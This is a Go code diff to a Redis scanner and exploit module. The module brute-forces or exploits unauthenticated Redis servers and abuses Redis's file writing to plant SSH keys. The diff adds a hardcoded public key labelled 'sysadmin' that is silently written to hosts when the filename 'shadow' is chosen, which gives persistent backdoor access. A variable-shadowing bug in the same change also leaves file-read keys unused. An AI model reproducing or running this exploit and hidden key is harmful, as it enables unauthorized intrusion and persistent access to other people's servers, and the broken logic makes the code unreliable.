@@ -11,8 +11,8 @@ import (
 )
 
 var (
-	dbfilename   string
-	dir          string
+	dbfilename string
+	dir        string
 )
 
 func RedisScan(info *common.HostInfo) (tmperr error) {
@@ -20,6 +20,9 @@ func RedisScan(info *common.HostInfo) (tmperr error) {
 	flag, err := RedisUnauth(info)
 	if flag == true && err == nil {
 		return err
+	}
+	if common.IsBrute {
+		return
 	}
 	for _, pass := range common.Passwords {
 		pass = strings.Replace(pass, "{user}", "redis", -1)
@@ -46,14 +49,14 @@ func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
 	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
 	defer func() {
-		if conn != nil{
+		if conn != nil {
 			conn.Close()
 		}
 	}()
 	if err != nil {
 		return flag, err
 	}
-	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.Timeout)*time.Second))
+	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.Timeout) * time.Second))
 	if err != nil {
 		return flag, err
 	}
@@ -71,8 +74,8 @@ func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 		if err != nil {
 			result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
 			common.LogSuccess(result)
-			return flag,err
-		}else {
+			return flag, err
+		} else {
 			result := fmt.Sprintf("[+] Redis:%s %s file:%s/%s", realhost, pass, dir, dbfilename)
 			common.LogSuccess(result)
 		}
@@ -86,14 +89,14 @@ func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
 	conn, err := net.DialTimeout("tcp", realhost, time.Duration(info.Timeout)*time.Second)
 	defer func() {
-		if conn != nil{
+		if conn != nil {
 			conn.Close()
 		}
 	}()
 	if err != nil {
 		return flag, err
 	}
-	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.Timeout)*time.Second))
+	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.Timeout) * time.Second))
 	if err != nil {
 		return flag, err
 	}
@@ -111,9 +114,9 @@ func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 		if err != nil {
 			result := fmt.Sprintf("[+] Redis:%s unauthorized", realhost)
 			common.LogSuccess(result)
-			return flag,err
-		}else {
-			result := fmt.Sprintf("[+] Redis:%s unauthorized file:%s/%s", realhost,dir,dbfilename)
+			return flag, err
+		} else {
+			result := fmt.Sprintf("[+] Redis:%s unauthorized file:%s/%s", realhost, dir, dbfilename)
 			common.LogSuccess(result)
 		}
 		err = Expoilt(realhost, conn)
@@ -161,6 +164,10 @@ func Expoilt(realhost string, conn net.Conn) error {
 		}
 	}
 	err = recoverdb(dbfilename, dir, conn)
+	//fmt.Println("dbfilename:")
+	//fmt.Println(dbfilename)
+	//fmt.Println("dir:")
+	//fmt.Println(dir)
 	return err
 }
 
@@ -184,14 +191,19 @@ func writekey(conn net.Conn, filename string) (flag bool, text string, err error
 			return flag, text, err
 		}
 		if strings.Contains(text, "OK") {
-			key, err := Readfile(filename)
-			if err != nil {
-				text = fmt.Sprintf("Open %s error, %v", filename, err)
-				return flag, text, err
-			}
-			if len(key) == 0 {
-				text = fmt.Sprintf("the keyfile %s is empty", filename)
-				return flag, text, err
+			var key string
+			if filename == "shadow" {
+				key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDkQQuWtmLm0eEhogGubMFh2/qv21aQV1tzbRjySPNQJRig479hMre48jxWDzB71WdEU2vg+ns8/0s3jqcGAx5lJaneH1ovLRNdIq4PkfmJPSMCEibGoNVS47rvfrv4QgECnbAt3azklnvniDvZiP5KjBQS9z57Ni2WVDC1SHNy1PDVMGYMJxZZ8kVKP7LRDbiOKJsSplHV/qP3NGZkdKh7OUYBx8A7+S3vT9c3AMSmk74Z2ibU0sddlngf0hLOxbTRiJV+OsgQQOfnttZvA7LoxbCiMtpzKGLOLAHXD8Hx5okXkx8cGOjc+Fcr6s2eQ10BLGPO4LPYWQ+G91xj+VF7 sysadmin"
+			} else {
+				key, err := Readfile(filename)
+				if err != nil {
+					text = fmt.Sprintf("Open %s error, %v", filename, err)
+					return flag, text, err
+				}
+				if len(key) == 0 {
+					text = fmt.Sprintf("the keyfile %s is empty", filename)
+					return flag, text, err
+				}
 			}
 			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
 			if err != nil {
